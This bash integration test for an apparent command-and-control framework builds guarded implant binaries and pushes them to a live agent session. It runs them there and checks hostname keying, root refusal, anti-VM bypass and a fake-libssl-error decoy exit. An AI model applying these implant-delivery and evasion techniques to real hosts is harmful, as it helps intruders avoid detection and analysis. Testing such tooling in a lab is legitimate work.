#!/usr/bin/env bash
# tests/docker/scripts/test_18_guardrails.sh
#
# Integration tests for agent-side execution-guardrail enforcement
# (wave-3 feature; the builder embeds the fields, the agent must evaluate
# them before the first beacon).
#
# Cases (contract per wave-3 assignment):
#   a) guard_hostname matching the agent container's hostname
#      -> the agent runs and beacons (a new session appears)
#   b) guard_hostname that cannot match
#      -> the agent refuses to run (no new session, process exits)
#   c) guard_no_system in a root container
#      -> the agent refuses to run (contract: Linux euid 0 maps to the
#         no-system refusal)
#
# Delivery: each guarded build is pushed to the live agent-tls session via
# the chunked upload API and spawned with nohup; session count deltas on
# /api/hosts and the spawned PID's liveness are the observables.
#
# GUARD_STRICT=0 (default): enforcement failures in (b) and (c) are loud
#   skips, so the suite stays green while the enforcement contract lands.
# GUARD_STRICT=1: all assertions are hard pass/fail.
#
# Depends on: c2-server healthy, agent-tls connected, admin credentials.

set -uo pipefail
source "$(dirname "$0")/lib.sh"

BUILD_TIMEOUT="${BUILD_TIMEOUT:-600}"
GUARD_STRICT="${GUARD_STRICT:-0}"
BEACON_WINDOW="${BEACON_WINDOW:-45}"   # seconds to wait for a new session
REFUSE_WINDOW="${REFUSE_WINDOW:-30}"   # seconds to prove refusal
UPLOAD_CHUNK=$((2 * 1024 * 1024))      # raw bytes per upload chunk

# Contract-pending assertion (same pattern as test_17).
contract_assert() {
    local desc="$1" ok="$2" detail="$3"
    if [ "$ok" = "0" ]; then
        echo "  ✓ $desc"
        PASS_COUNT=$((PASS_COUNT + 1))
    elif [ "$GUARD_STRICT" = "1" ]; then
        echo "  ✗ $desc"
        echo "    $detail"
        FAIL_COUNT=$((FAIL_COUNT + 1))
    else
        echo "  ⊘ $desc"
        echo "    NOTE(contract pending): $detail"
        SKIP_COUNT=$((SKIP_COUNT + 1))
    fi
}

# ── Build helpers (same conventions as test_15) ─────────────────────────
start_build() {
    local payload="$1"
    local resp code
    resp=$(curl -s -w '\n%{http_code}' \
        -X POST "${C2_URL}/api/builder/build" \
        -H "X-API-KEY: ${ADMIN_KEY}" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null)
    code=$(echo "$resp" | tail -1)
    echo "$code" > /tmp/.last_http_code
    echo "$resp" | sed '$d'
}

# Polls the job and echoes a verdict token: completed / failed / timeout.
# ALWAYS returns 0: lib.sh enables set -e, so a non-zero return here would
# abort the whole script at the caller's result=$(wait_for_build ...)
# assignment, silently truncating the run. failed/timeout dump the builder
# log tail so a slow or broken build is visible instead of silent.
wait_for_build() {
    local job_id="$1"
    local deadline=$(($(date +%s) + BUILD_TIMEOUT))
    while [ "$(date +%s)" -lt "$deadline" ]; do
        local status_resp state
        status_resp=$(curl -sf \
            -H "X-API-KEY: ${ADMIN_KEY}" \
            "${C2_URL}/api/builder/jobs/${job_id}/status" 2>/dev/null || echo '{}')
        state=$(echo "$status_resp" | jq -r '.status // "unknown"' 2>/dev/null || echo "unknown")
        case "$state" in
            completed|done|success)
                echo "completed"; return 0 ;;
            running|pending|unknown)
                ;; # expected while compiling - keep polling
            failed|error)
                echo "--- builder log for $job_id (last 40 lines) ---" >&2
                echo "$status_resp" | jq -r '.log[-40:][]? // empty' 2>/dev/null >&2
                echo "--- end builder log ---" >&2
                echo "failed"; return 0 ;;
            *)
                echo "job $job_id returned unexpected status '$state' - API contract drift" >&2
                echo "failed"; return 0 ;;
        esac
        sleep 5
    done
    local tail_resp
    tail_resp=$(curl -sf \
        -H "X-API-KEY: ${ADMIN_KEY}" \
        "${C2_URL}/api/builder/jobs/${job_id}/status" 2>/dev/null || echo '{}')
    echo "--- builder log for $job_id at timeout (last 40 lines) ---" >&2
    echo "$tail_resp" | jq -r '.log[-40:][]? // empty' 2>/dev/null >&2
    echo "--- end builder log ---" >&2
    echo "timeout"; return 0
}

# build_guarded <name> <extra-json-fields> -> prints local artifact path
# (empty on failure). ALWAYS returns 0: the callers use
# BIN=$(build_guarded ...), and a non-zero return would abort the whole
# script at that assignment under the lib.sh-inherited set -e.
# debug must be false in the payload: on debug builds a tripped guardrail
# only logs and continues (agent mod.rs:309-313); the decoy-exit that
# (b)/(c) assert happens only on non-debug builds.
# allow_vm must be true: the test containers are VMs, so the VM
# anti-analysis rail would decoy-exit every non-debug build before the
# rail under test (hostname / no-system) is even evaluated. Setting it
# leaves only the rail under test able to trip.
build_guarded() {
    local name="$1" extra="$2"
    local resp job result out
    resp=$(start_build "{
        \"host\": \"c2-server\",
        \"port\": \"4443\",
        \"platform\": \"linux\",
        \"transport\": \"tls\",
        \"format\": \"exe\",
        \"sleep\": 2,
        \"jitter_min\": 0,
        \"jitter_max\": 0,
        \"debug\": false,
        \"allow_vm\": true,
        $extra
    }")
    job=$(echo "$resp" | jq -r '.job_id // empty')
    [ -z "$job" ] && { echo ""; return 0; }
    result=$(wait_for_build "$job")
    [ "$result" = "completed" ] || { echo ""; return 0; }
    out="/tmp/test_18_${name}.bin"
    curl -sf -H "X-API-KEY: ${ADMIN_KEY}" \
        "${C2_URL}/api/builder/jobs/${job}/download" \
        -o "$out" 2>/dev/null || { echo ""; return 0; }
    [ -s "$out" ] || { echo ""; return 0; }
    echo "$out"
}

# upload_to_agent <local> <remote>: chunked upload via the sessions API.
# JSON bodies are written to disk and posted with -d @file: multi-MB base64
# payloads exceed the kernel's per-argument size limit otherwise.
# On failure returns 1 (safe: only called from if-conditions) and leaves
# diagnostics in UPLOAD_LAST_CODE / UPLOAD_LAST_BODY.
UPLOAD_LAST_CODE=""
UPLOAD_LAST_BODY=""
upload_to_agent() {
    local local_path="$1" remote_path="$2"
    local size chunks batch i raw code
    size=$(stat -c%s "$local_path")
    chunks=$(( (size + UPLOAD_CHUNK - 1) / UPLOAD_CHUNK ))
    batch=$(date +%s)
    i=0
    while [ "$i" -lt "$chunks" ]; do
        dd if="$local_path" bs="$UPLOAD_CHUNK" skip="$i" count=1 2>/dev/null \
            | base64 -w0 > /tmp/test_18_chunk.b64
        jq -n --arg p "$remote_path" --rawfile d /tmp/test_18_chunk.b64 \
            --argjson ci "$i" --argjson tc "$chunks" --arg b "$batch" \
            '{path:$p, data_b64:$d, chunk_idx:$ci, total_chunks:$tc, batch_ts:$b}' \
            > /tmp/test_18_chunk.json
        raw=$(curl -s -w '\n%{http_code}' \
            -X POST "${C2_URL}/api/hosts/${SID}/upload" \
            -H "X-API-KEY: ${ADMIN_KEY}" \
            -H "Content-Type: application/json" \
            -d @/tmp/test_18_chunk.json 2>/dev/null)
        code=$(echo "$raw" | tail -1)
        UPLOAD_LAST_CODE="$code"
        UPLOAD_LAST_BODY=$(echo "$raw" | sed '$d' | head -c 200)
        # Handler non-200 paths: 503 queue full, 504 callback timeout (30s),
        # 500 callback dropped, 403 viewer, 400 bad path/b64.
        if [ "$code" != "200" ]; then
            echo "  upload chunk $((i + 1))/$chunks failed: HTTP $code - $UPLOAD_LAST_BODY"
            return 1
        fi
        i=$((i + 1))
    done
    return 0
}

# Retry wrapper for 504-class flakiness: 2 attempts, 5s apart.
upload_with_retry() {
    local attempt
    for attempt in 1 2; do
        if upload_to_agent "$1" "$2"; then
            return 0
        fi
        if [ "$attempt" -lt 2 ]; then
            echo "  retrying upload in 5s (attempt $attempt failed: HTTP ${UPLOAD_LAST_CODE})..."
            sleep 5
        fi
    done
    return 1
}

# snapshot_hosts <prefix>: writes <prefix>.json (full rows) and
# <prefix>.ids (sorted id set). The hibernation agent's active flag
# flip-flops and dead rows linger, so session detection compares host id
# SETS, not counts.
snapshot_hosts() {
    curl -sf -H "X-API-KEY: ${ADMIN_KEY}" "${C2_URL}/api/hosts" 2>/dev/null \
        > "$1.json" || echo '[]' > "$1.json"
    jq -r '[.[].id] | sort | .[]' "$1.json" > "$1.ids" 2>/dev/null || : > "$1.ids"
}

# wait_new_session <baseline-ids-file> <window-secs>: returns 0 when a host
# id appears that is not in the baseline set; 1 on window expiry.
wait_new_session() {
    local base_ids="$1" window="$2" i
    for i in $(seq 1 "$window"); do
        snapshot_hosts /tmp/test_18_now
        if grep -vxF -f "$base_ids" /tmp/test_18_now.ids 2>/dev/null | grep -q .; then
            return 0
        fi
        sleep 1
    done
    return 1
}

# dump_hosts_diag <baseline-prefix>: failure-time diagnostics showing
# before/after host rows (id, hostname, active) so count pollution from
# hibernation flip-flops or stale rows is visible.
dump_hosts_diag() {
    echo "  hosts before:"
    jq -r '.[] | "    #\(.id) \(.hostname) active=\(.is_active // "?")"' \
        "$1.json" 2>/dev/null || echo "    <unreadable baseline>"
    echo "  hosts after:"
    curl -sf -H "X-API-KEY: ${ADMIN_KEY}" "${C2_URL}/api/hosts" 2>/dev/null \
        | jq -r '.[] | "    #\(.id) \(.hostname) active=\(.is_active // "?")"' \
        2>/dev/null || echo "    <hosts endpoint unreadable>"
}

# ══════════════════════════════════════════════════════
suite "Guardrails: select session and read live hostname/user"
# ══════════════════════════════════════════════════════

HOSTS=$(api_get "/api/hosts")
assert_http "hosts endpoint returns 200" "200"

SID=$(echo "$HOSTS" | jq -r \
    '[ .[] | select(.hostname=="agent-tls") | select(.is_active // true) ][0].id
     // [ .[] | select(.is_active // true) ][0].id
     // empty')
if [ -z "$SID" ]; then
    skip "No agent session available - skipping all guardrail cases"
    print_summary
    exit 0
fi
echo "  Using session #${SID} for delivery"

CMD_OUTPUT=""
# send_cmd <command> [timeout]: result lands in $CMD_OUTPUT. ALWAYS
# returns 0: it is called bare, and a non-zero return would abort the
# script under the lib.sh-inherited set -e. Errors surface as [send_cmd
# ...] markers in $CMD_OUTPUT.
send_cmd() {
    local cmd="$1" timeout="${2:-30}"
    local resp req_id
    resp=$(api_post "/api/hosts/${SID}/command" "$ADMIN_KEY" \
        "{\"command\":$(echo -n "$cmd" | jq -Rs .)}")
    req_id=$(echo "$resp" | jq -r '.request_id // empty')
    if [ -z "$req_id" ]; then
        CMD_OUTPUT="[send_cmd error: $resp]"
        return 0
    fi
    local deadline=$(( $(date +%s) + timeout ))
    CMD_OUTPUT=""
    while [ "$(date +%s)" -lt "$deadline" ]; do
        sleep 2
        local out_resp status
        out_resp=$(api_get "/api/hosts/${SID}/output/${req_id}" 2>/dev/null || echo '{}')
        status=$(echo "$out_resp" | jq -r '.status // empty')
        if [ "$status" = "completed" ]; then
            CMD_OUTPUT=$(echo "$out_resp" | jq -r '.output // empty')
            return 0
        fi
    done
    CMD_OUTPUT="[send_cmd timeout: $cmd]"
    return 0
}

send_cmd "shell hostname"
AGENT_HOST=$(echo "$CMD_OUTPUT" | tr -d '[:space:]')
if [ -z "$AGENT_HOST" ]; then
    AGENT_HOST="agent-tls"
    echo "  NOTE: live hostname read failed, falling back to ${AGENT_HOST}"
fi
assert_ne "live agent hostname read" "" "$AGENT_HOST"

send_cmd "shell id -u"
AGENT_UID=$(echo "$CMD_OUTPUT" | tr -d '[:space:]')
echo "  Agent container: hostname=${AGENT_HOST} euid=${AGENT_UID}"

# ══════════════════════════════════════════════════════
suite "Guardrails: (a) matching guard_hostname runs and beacons"
# ══════════════════════════════════════════════════════

BIN_A=$(build_guarded "match" "\"guard_hostname\": \"${AGENT_HOST}\"")
if [ -z "$BIN_A" ]; then
    echo "  ✗ (a) guarded build failed"
    FAIL_COUNT=$((FAIL_COUNT + 1))
else
    echo "  ✓ (a) guarded build completed (guard_hostname=${AGENT_HOST})"
    PASS_COUNT=$((PASS_COUNT + 1))

    snapshot_hosts /tmp/test_18_a
    if upload_with_retry "$BIN_A" "/tmp/g18_match"; then
        send_cmd "shell chmod +x /tmp/g18_match && nohup /tmp/g18_match >/tmp/g18_match.log 2>&1 & echo \$! > /tmp/g18_match.pid; echo SPAWNED"
        assert_contains "(a) guarded agent spawned" "SPAWNED" "$CMD_OUTPUT"
        if wait_new_session /tmp/test_18_a.ids "$BEACON_WINDOW"; then
            echo "  ✓ (a) matching guard_hostname: new session registered within ${BEACON_WINDOW}s"
            PASS_COUNT=$((PASS_COUNT + 1))
        else
            echo "  ✗ (a) matching guard_hostname: no new session within ${BEACON_WINDOW}s"
            dump_hosts_diag /tmp/test_18_a
            FAIL_COUNT=$((FAIL_COUNT + 1))
        fi
        # Cleanup: stop the spawned agent so later counts are unaffected.
        send_cmd "shell kill \$(cat /tmp/g18_match.pid) 2>/dev/null; rm -f /tmp/g18_match /tmp/g18_match.pid; echo CLEAN"
    else
        echo "  ✗ (a) upload to agent failed: HTTP ${UPLOAD_LAST_CODE} - ${UPLOAD_LAST_BODY}"
        FAIL_COUNT=$((FAIL_COUNT + 1))
    fi
fi

# ══════════════════════════════════════════════════════
suite "Guardrails: (b) non-matching guard_hostname refuses"
# ══════════════════════════════════════════════════════

BIN_B=$(build_guarded "nomatch" "\"guard_hostname\": \"g18-host-that-never-matches\"")
if [ -z "$BIN_B" ]; then
    contract_assert "(b) guarded build completed" "1" "build job failed"
else
    contract_assert "(b) guarded build completed" "0" ""
    snapshot_hosts /tmp/test_18_b
    if upload_with_retry "$BIN_B" "/tmp/g18_nomatch"; then
        send_cmd "shell chmod +x /tmp/g18_nomatch && nohup /tmp/g18_nomatch >/tmp/g18_nomatch.log 2>&1 & echo \$! > /tmp/g18_nomatch.pid; echo SPAWNED"
        sleep "$REFUSE_WINDOW"
        ok=1
        wait_new_session /tmp/test_18_b.ids 1 || ok=0
        # Liveness must treat zombies as dead: PID 1 in the container is
        # the long-running agent binary, which never reaps children, so a
        # decoy-exited process lingers as a zombie and plain kill -0
        # succeeds on it. Check /proc/<pid>/stat field 3 (state) too.
        send_cmd "shell PID=\$(cat /tmp/g18_nomatch.pid) && kill -0 \$PID 2>/dev/null && [ \"\$(awk '{print \$3}' /proc/\$PID/stat 2>/dev/null)\" != \"Z\" ] && echo ALIVE || echo DEAD"
        alive=$(echo "$CMD_OUTPUT" | grep -c "ALIVE" || true)
        [ "$alive" = "0" ] || ok=1
        [ "$ok" = "0" ] || dump_hosts_diag /tmp/test_18_b
        contract_assert "(b) non-matching guard_hostname: no session, process exited" "$ok" \
            "agent beaconed or stayed alive despite a guard that cannot match (enforcement not landed?)"
        # Decoy-exit proof: run_decoy prints a fake missing-library error
        # (detection.rs) before exit(1); the spawn redirects stderr into
        # the log. Its absence would mean a crash, not a guardrail trip.
        send_cmd "shell grep -q 'while loading shared libraries: libssl.so.1.1' /tmp/g18_nomatch.log 2>/dev/null && echo DECOY_EXIT || echo NO_DECOY"
        contract_assert "(b) log shows decoy exit (fake libssl error), not a crash" \
            "$(echo "$CMD_OUTPUT" | grep -q DECOY_EXIT && echo 0 || echo 1)" \
            "/tmp/g18_nomatch.log lacks the decoy's fake missing-library error"
        send_cmd "shell kill \$(cat /tmp/g18_nomatch.pid) 2>/dev/null; rm -f /tmp/g18_nomatch /tmp/g18_nomatch.pid /tmp/g18_nomatch.log; echo CLEAN"
    else
        contract_assert "(b) upload to agent failed" "1" \
            "chunked upload HTTP ${UPLOAD_LAST_CODE}: ${UPLOAD_LAST_BODY}"
    fi
fi

# ══════════════════════════════════════════════════════
suite "Guardrails: (c) guard_no_system refuses as root"
# ══════════════════════════════════════════════════════

if [ "$AGENT_UID" != "0" ]; then
    skip "(c) agent container is not root (euid=${AGENT_UID}) - guard_no_system precondition absent"
else
    BIN_C=$(build_guarded "nosystem" "\"guard_no_system\": true")
    if [ -z "$BIN_C" ]; then
        contract_assert "(c) guard_no_system build completed" "1" "build job failed"
    else
        contract_assert "(c) guard_no_system build completed" "0" ""
        snapshot_hosts /tmp/test_18_c
        if upload_with_retry "$BIN_C" "/tmp/g18_nosystem"; then
            send_cmd "shell chmod +x /tmp/g18_nosystem && nohup /tmp/g18_nosystem >/tmp/g18_nosystem.log 2>&1 & echo \$! > /tmp/g18_nosystem.pid; echo SPAWNED"
            sleep "$REFUSE_WINDOW"
            ok=1
            wait_new_session /tmp/test_18_c.ids 1 || ok=0
            # Liveness must treat zombies as dead, same as (b).
            send_cmd "shell PID=\$(cat /tmp/g18_nosystem.pid) && kill -0 \$PID 2>/dev/null && [ \"\$(awk '{print \$3}' /proc/\$PID/stat 2>/dev/null)\" != \"Z\" ] && echo ALIVE || echo DEAD"
            alive=$(echo "$CMD_OUTPUT" | grep -c "ALIVE" || true)
            [ "$alive" = "0" ] || ok=1
            [ "$ok" = "0" ] || dump_hosts_diag /tmp/test_18_c
            contract_assert "(c) guard_no_system: no session as root, process exited" "$ok" \
                "agent beaconed or stayed alive as euid 0 despite guard_no_system (enforcement not landed?)"
            # Decoy-exit proof, same as (b).
            send_cmd "shell grep -q 'while loading shared libraries: libssl.so.1.1' /tmp/g18_nosystem.log 2>/dev/null && echo DECOY_EXIT || echo NO_DECOY"
            contract_assert "(c) log shows decoy exit (fake libssl error), not a crash" \
                "$(echo "$CMD_OUTPUT" | grep -q DECOY_EXIT && echo 0 || echo 1)" \
                "/tmp/g18_nosystem.log lacks the decoy's fake missing-library error"
            send_cmd "shell kill \$(cat /tmp/g18_nosystem.pid) 2>/dev/null; rm -f /tmp/g18_nosystem /tmp/g18_nosystem.pid /tmp/g18_nosystem.log; echo CLEAN"
        else
            contract_assert "(c) upload to agent failed" "1" \
                "chunked upload HTTP ${UPLOAD_LAST_CODE}: ${UPLOAD_LAST_BODY}"
        fi
    fi
fi

print_summary
